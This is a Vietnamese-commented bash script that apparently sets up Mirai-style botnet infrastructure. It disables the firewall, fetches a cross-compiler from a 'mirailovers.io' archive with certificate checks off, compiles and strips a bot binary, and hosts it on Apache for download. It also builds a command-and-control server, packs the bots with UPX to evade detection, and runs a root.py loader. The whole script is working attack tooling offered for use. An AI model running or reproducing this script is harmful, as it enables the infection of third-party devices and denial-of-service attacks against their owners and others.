#!/bin/bash

# Cập nhật và cài đặt các gói cần thiết
apt update && apt install nano screen gcc perl wget bzip2 php python3 apache2 xinetd tftpd-hpa vsftpd -y

# Khởi động lại Apache và dừng iptables (Ubuntu sử dụng ufw thay vì iptables)
systemctl restart apache2
ufw disable

# Xóa tất cả các quy tắc iptables nếu vẫn còn sử dụng
iptables -F

# Tạo thư mục cho cross-compiler
mkdir -p /etc/xcompile
cd /etc/xcompile

# Tải và giải nén cross-compiler
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i586.tar.bz2 --no-check-certificate
tar -jxf cross-compiler-i586.tar.bz2
rm -rf cross-compiler-i586.tar.bz2
mv cross-compiler-i586 i586
cd ~/

# Thêm cross-compiler vào PATH
export PATH=$PATH:/etc/xcompile/i586/bin

# Hàm biên dịch bot
function compile_bot {
    "$1-gcc" $3 main/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DDREAD_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

# Tạo thư mục và biên dịch bot
mkdir -p release
compile_bot i586 rbot "-static"

# Di chuyển tệp vào thư mục web
mkdir -p /var/www/html/botpilled
mv ~/release/* /var/www/html/botpilled
rm -rf release

# Khởi động lại các dịch vụ
systemctl restart apache2
systemctl restart xinetd
systemctl restart vsftpd

# Thiết lập ulimit
ulimit -n 999999

# Biên dịch và di chuyển các công cụ
gcc cnc.c -o cnc -pthread
mv ~/tools/iptool.php /var/www/html

# Nén file bot bằng upx
mv ~/tools/upx ~/
chmod +x upx
./upx --ultra-brute /var/www/html/botpilled/*
rm -rf upx

# Chạy script root.py
mv ~/tools/root.py ~/
rm -rf tools

# Xóa iptables
iptables -F

clear

# Chạy script python
python3 root.py